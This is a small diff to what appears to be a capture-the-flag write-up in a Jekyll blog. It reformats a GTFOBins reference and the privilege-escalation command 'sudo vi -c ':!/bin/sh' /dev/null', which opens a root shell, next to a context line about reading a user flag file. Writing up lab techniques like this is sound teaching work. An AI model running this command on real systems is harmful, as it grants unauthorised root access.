@@ -177,9 +177,9 @@ cat /home/charlie/user.txt
 <br>
 
 ## Looking for binary exploits we see a vi script:
-[gtfobins/vi/#sudo](https://gtfobins.github.io/gtfobins/vi/#sudo)
+## [gtfobins/vi/#sudo](https://gtfobins.github.io/gtfobins/vi/#sudo)
 {% highlight bash %}
-"$ sudo vi -c ':!/bin/sh' /dev/null"
+$ sudo vi -c ':!/bin/sh' /dev/null
 {% endhighlight bash %}
 
 ## Entering this command is successful
